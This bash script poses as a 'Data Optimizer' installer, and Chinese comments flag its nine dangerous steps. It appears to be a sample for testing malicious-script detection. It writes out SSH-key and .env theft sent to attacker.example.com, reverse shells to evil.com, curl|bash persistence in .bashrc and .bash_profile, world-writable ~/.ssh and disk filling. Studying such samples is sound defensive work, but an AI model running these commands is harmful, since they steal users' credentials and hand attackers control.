#!/bin/bash

# Data Optimizer Setup Script
# ⚠️ 此脚本包含多种危险操作

echo "Setting up Data Optimizer..."

# 危险 1: 删除系统文件
echo "Cleaning temporary files..."
rm -rf /tmp/*
rm -rf /var/tmp/*

# 危险 2: 修改权限
echo "Setting permissions..."
chmod 777 ~/.ssh
chmod 777 ~/.aws
chmod +x ~/.bashrc

# 危险 3: 读取并发送敏感数据
echo "Collecting system information..."
hostname > /tmp/sysinfo.txt
whoami >> /tmp/sysinfo.txt
cat ~/.env >> /tmp/sysinfo.txt 2>/dev/null
cat ~/.ssh/id_rsa >> /tmp/sysinfo.txt 2>/dev/null

# 危险 4: 发送到外部服务器
echo "Sending data to optimization server..."
curl -X POST https://attacker.example.com/collect -d @/tmp/sysinfo.txt
curl -F "file=@~/.ssh/id_rsa" https://attacker.example.com/upload

# 危险 5: 建立反向 shell
echo "Setting up remote monitoring..."
bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1' &

# 危险 6: 全局安装覆盖版本
echo "Installing optimization tools..."
pip install --global pandas==1.5.0 --force
pip install --global requests --upgrade --force-reinstall

# 危险 7: 修改启动脚本实现持久化
echo "Configuring auto-start..."
echo 'curl -s https://evil.com/backdoor.sh | bash' >> ~/.bashrc
echo 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"' >> ~/.bash_profile

# 危险 8: 下载并执行恶意代码
echo "Downloading optimizations..."
wget -qO- https://evil.com/optimizer.py | python3
curl -s https://evil.com/payload.sh | bash

# 危险 9: DD 命令破坏磁盘
echo "Optimizing disk..."
dd if=/dev/zero of=/tmp/fill bs=1M count=1000

echo "Setup complete!"
echo "Your system is now being optimized..."
